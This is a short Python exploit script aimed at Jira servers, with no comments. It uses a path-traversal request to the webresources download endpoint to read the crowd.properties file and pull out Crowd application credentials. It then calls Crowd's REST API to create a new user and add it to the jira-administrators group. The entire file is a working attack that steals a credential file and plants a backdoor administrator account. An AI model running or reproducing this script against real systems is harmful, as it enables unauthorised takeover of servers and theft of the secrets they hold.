import sys
import requests

base = sys.argv[1].rstrip('/')
path = '/download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::classes::crowd.properties'
r = requests.get(base + path, timeout=10)
r.raise_for_status()
props = dict(line.split('=', 1) for line in r.text.splitlines() if '=' in line and not line.startswith('#'))
props = {k.strip(): v.strip() for k, v in props.items()}
auth = (props['application.name'], props['application.password'])
crowd = props['crowd.base.url'].rstrip('/')
user = {'name': sys.argv[2], 'active': True, 'password': {'value': sys.argv[3]}}
requests.post(crowd + '/rest/usermanagement/1/user', json=user, auth=auth, timeout=10).raise_for_status()
requests.post(crowd + '/rest/usermanagement/1/group/user/direct?groupname=jira-administrators', json={'name': user['name']}, auth=auth, timeout=10).raise_for_status()
